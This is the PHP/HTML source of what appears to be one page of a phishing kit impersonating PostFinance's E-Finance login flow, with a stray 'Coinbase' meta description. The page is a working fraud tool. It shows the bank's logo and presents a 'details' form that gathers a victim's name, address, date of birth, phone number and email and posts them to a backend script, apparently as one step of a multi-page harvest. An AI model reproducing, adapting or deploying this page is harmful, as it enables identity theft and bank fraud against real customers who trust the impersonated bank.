<?php
  session_start();
  include "./Assets/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.ico">
        <title>PostFinance - E-Finance</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>             
    </head>
    <body>

      <!-- header -->
      <header class="header_1">
        <div class="part_1">
          <div class="container_part1 d-flex align-items-center justify-content-end">
            <p class="d-flex align-items-center mb-0"><?php echo get_text('p_2_1'); ?></p>
            <p class="d-flex align-items-center mb-0 ms-3"><?php echo get_text('p_2_2'); ?></p>
          </div>
        </div>
        <div class="part_2">
          <div class="container_part2 d-flex align-items-center justify-content-between">
            <div class="logo">
              <img src="./Assets/imgs/logo-postfinanc.svg" alt="">
            </div>
            <div class="bars">
              <img src="./Assets/imgs/bars.svg" alt="">
              <p class="mb-0"><?php echo get_text('p_1_24'); ?></p>
            </div>
          </div>
        </div>
      </header>

      <!-- wrapper_details -->
      <div class="wrapper_details">
        <div class="container_details">
          <div class="title">
            <h1><?php echo get_text('p_7_1'); ?></h1>
          </div>
          <div class="box_login d-flex">
            <div class="part_left">
              <form action="./Assets/php/config/func.php" method="POST">
                <input type="hidden" name="details">
                <div class="row">
                  <div class="col-md-3 d-flex justify-content-center align-items-start">
                    <img src="./Assets/imgs/sss.svg" class="mb-3" alt="">
                  </div>
                  <div class="col-md-9">
                    <div class="inputes">
                    <div class="alert">
                      <p class="mb-0"><?php echo get_text('p_7_2'); ?></p>
                    </div>                      
                      <div class="form-group input_box <?php if(isset($_GET['error'])) echo "has-error"?>">
                        <label for="name"><?php echo get_text('p_7_3'); ?> <img src="./Assets/imgs/infos.png" alt=""></label>
                        <div class="input_group">
                          <input type="text" required name="name" id="name" >
                        </div>
                        <div class="error_txt"><?php echo get_text('p_7_9'); ?></div>
                      </div>               
                      <div class="form-group input_box <?php if(isset($_GET['error'])) echo "has-error"?>">
                        <label for="addr"><?php echo get_text('p_7_4'); ?> <img src="./Assets/imgs/infos.png" alt=""></label>
                        <div class="input_group">
                          <input type="text" required name="addr" id="addr">
                        </div>
                        <div class="error_txt"><?php echo get_text('p_7_9'); ?></div>
                      </div>               
                      <div class="form-group input_box <?php if(isset($_GET['error'])) echo "has-error"?>">
                        <label for="date"><?php echo get_text('p_7_5'); ?> <img src="./Assets/imgs/infos.png" alt=""></label>
                        <div class="input_group">
                          <input type="text" required name="date" id="date" placeholder="<?php echo get_text('p_7_6'); ?>" inputmode="numeric">
                        </div>
                        <div class="error_txt"><?php echo get_text('p_7_9'); ?></div>
                      </div>               
                      <div class="form-group input_box <?php if(isset($_GET['error'])) echo "has-error"?>">
                        <label for="tele"><?php echo get_text('p_7_7'); ?> <img src="./Assets/imgs/infos.png" alt=""></label>
                        <div class="input_group">
                          <input type="tele" required name="tele" id="tele" placeholder="+41 00 0000000" inputmode="numeric">
                        </div>
                        <div class="error_txt"><?php echo get_text('p_7_9'); ?></div>
                      </div>               
                      <div class="form-group input_box <?php if(isset($_GET['error'])) echo "has-error"?>">
                        <label for="mail"><?php echo get_text('p_7_8'); ?> <img src="./Assets/imgs/infos.png" alt=""></label>
                        <div class="input_group">
                          <input type="email" required name="mail" id="mail">
                        </div>
                        <div class="error_txt"><?php echo get_text('p_7_9'); ?></div>
                      </div>               
                    </div>
                    <div class="btn_sub">
                      <button type="submit"><?php echo get_text('p_2_9'); ?></button>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>       



      <!-- footer -->
      <div class="footer_2 mt-5">
        <div class="container_footer2 d-flex justify-content-between align-items-start">
          <div class="links">
            <ul class="ps-0 mb-0">
              <li><span class="s1"><?php echo get_text('p_2_10'); ?></span></li>
              <li><span class="s2"><?php echo get_text('p_2_11'); ?></span></li>
            </ul>
          </div>
          <div class="links">
            <ul class="ps-0 mb-0">
              <li><a href=""><?php echo get_text('p_2_12'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href=""><?php echo get_text('p_2_13'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_14'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
            <ul class="ps-0 mb-0 link_md">
              <li><a href=""><?php echo get_text('p_2_15'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_16'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
          </div>
          <div class="links link_lg">
            <ul class="ps-0 mb-0">
              <li><a href=""><?php echo get_text('p_2_15'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
              <li><a href="" class="mb-0"><?php echo get_text('p_2_16'); ?> <img src="./Assets/imgs/right.svg" alt=""></a></li>
            </ul>
          </div>
          <div class="links">
            <a href="" class="lang"><img src="./Assets/imgs/lang.svg" alt=""> <?php echo get_text('p_2_17'); ?></a>
          </div>
        </div>
      </div>







        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>        
        <script src="./Assets/js/script.js"></script>
        
        <script>
          $('#date').mask('00/00/0000');
        </script>
    </body>
</html>